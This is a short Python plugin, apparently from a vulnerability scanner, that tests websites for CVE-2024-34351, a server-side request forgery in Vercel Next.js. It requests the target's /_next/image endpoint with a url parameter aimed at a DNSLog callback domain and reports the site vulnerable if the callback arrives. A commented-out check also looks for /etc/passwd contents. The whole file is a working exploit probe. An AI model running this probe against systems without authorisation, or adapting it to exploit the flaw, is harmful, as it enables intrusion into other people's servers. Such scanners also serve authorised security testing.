#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
import script.DnsLog as dnslog
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/4N9JNYRLpbEORRNzIvVgyw',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Vercel next服务器端请求伪造 CVE-2024-34351',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/7/18',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  domain,cookie = dnslog.get_domain()
  # print(domain)
  target = f'/_next/image?w=16&q=10&url=http://{domain}'
  url1 = url + target
  ret['url'] = url1

  try:
    res=requests.get(url=url1,headers=headers,timeout=10,verify=False)
    # if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
    result = dnslog.get_result(domain,cookie)
    # print(result)
    if result == True:
      ret['huixian'] = result
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret